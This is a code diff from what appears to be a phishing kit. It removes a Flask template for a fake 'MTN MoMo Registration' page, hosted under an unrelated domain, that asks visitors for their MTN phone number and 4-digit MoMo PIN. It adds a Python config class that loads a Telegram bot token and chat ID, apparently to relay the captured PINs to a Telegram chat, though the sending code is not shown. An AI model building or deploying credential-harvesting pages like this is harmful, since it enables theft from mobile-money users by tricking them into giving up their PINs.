@@ -1,58 +1,20 @@
-<!DOCTYPE html>
-<html lang="en">
-<head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>MTN MoMo Registration</title>
-    <link rel="stylesheet" href="{{ url_for('static', filename='style.css') }}">
-</head>
-<body>
-    <div class="container">
-        <div class="card">
-            <div class="header">
-                <img src="{{ url_for('static', filename='../images/Image.jpeg') }}" 
-                     alt="Logo" 
-                     class="logo"
-                     onerror="this.style.display='none'">
-                <h1>jianway.co.uk</h1>
-            </div>
-            
-            <form id="registrationForm" class="registration-form">
-                <div class="input-group">
-                    <label for="mtnNumber">MTN NUMBER</label>
-                    <input 
-                        type="tel" 
-                        id="mtnNumber" 
-                        name="mtn_number" 
-                        placeholder="Enter MTN number" 
-                        required
-                        pattern="[0-9\s\+]{10,15}"
-                        maxlength="15"
-                    >
-                </div>
-                
-                <div class="input-group">
-                    <label for="momoPin">MOMO PIN</label>
-                    <input 
-                        type="password" 
-                        id="momoPin" 
-                        name="momo_pin" 
-                        placeholder="Enter 4-digit PIN" 
-                        required
-                        pattern="[0-9]{4}"
-                        maxlength="4"
-                        minlength="4"
-                    >
-                    <span class="toggle-pin" onclick="togglePinVisibility()">👁️</span>
-                </div>
-                
-                <button type="submit" class="register-btn">REGISTER</button>
-            </form>
-            
-            <div id="messageContainer" class="message-container"></div>
-        </div>
-    </div>
+import os
+from dotenv import load_dotenv
+
+# Load environment variables
+load_dotenv()
+
+class Config:
+    SECRET_KEY = os.environ.get('SECRET_KEY') or os.urandom(24).hex()
+    TELEGRAM_BOT_TOKEN = os.environ.get('TELEGRAM_BOT_TOKEN')
+    TELEGRAM_CHAT_ID = os.environ.get('TELEGRAM_CHAT_ID')
+    DEBUG = os.environ.get('DEBUG', 'False').lower() == 'true'
     
-    <script src="{{ url_for('static', filename='script.js') }}"></script>
-</body>
-</html>
+    @staticmethod
+    def validate_config():
+        """Validate required configuration"""
+        if not Config.TELEGRAM_BOT_TOKEN:
+            raise ValueError("TELEGRAM_BOT_TOKEN is not set in environment variables")
+        if not Config.TELEGRAM_CHAT_ID:
+            raise ValueError("TELEGRAM_CHAT_ID is not set in environment variables")
+        return True
